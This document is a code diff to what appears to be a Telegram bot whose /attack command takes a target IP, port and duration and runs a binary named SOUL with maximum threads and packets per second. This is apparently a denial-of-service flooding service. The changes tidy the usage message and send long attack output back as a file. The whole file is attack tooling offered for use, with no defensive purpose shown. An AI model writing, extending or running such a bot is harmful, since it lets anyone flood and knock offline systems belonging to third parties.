@@ -24,9 +24,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     args = context.args
     if len(args) != 3:
-        await update.message.reply_text(
-            "Usage: /attack <IP> <PORT> <DURATION>"
-        )
+        await update.message.reply_text("Usage: /attack <IP> <PORT> <DURATION>")
         return
 
     ip, port, duration = args
@@ -35,7 +33,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         # Make SOUL executable
         os.chmod("./SOUL", 0o755)
 
-        # Run SOUL binary with max threads and PPS
+        # Run SOUL binary
         result = subprocess.run(
             ["./SOUL", ip, str(port), str(duration), MAX_THREADS, MAX_PPS],
             capture_output=True,
@@ -45,8 +43,21 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         output = result.stdout
         error = result.stderr
 
-        response = f"✅ Attack executed.\n\nOutput:\n{output}\nError:\n{error}"
-        await update.message.reply_text(response)
+        # Telegram has message limits, so send as file if too long
+        combined_output = f"Output:\n{output}\n\nError:\n{error}"
+        if len(combined_output) > 3500:  # keep buffer for caption
+            filename = "attack_output.txt"
+            with open(filename, "w") as f:
+                f.write(combined_output)
+
+            await update.message.reply_document(
+                document=open(filename, "rb"),
+                filename=filename,
+                caption="✅ SOUL attack executed. Full output attached."
+            )
+            os.remove(filename)
+        else:
+            await update.message.reply_text(combined_output or "✅ Attack executed with no output.")
 
     except Exception as e:
         await update.message.reply_text(f"❌ Failed to run SOUL: {str(e)}")
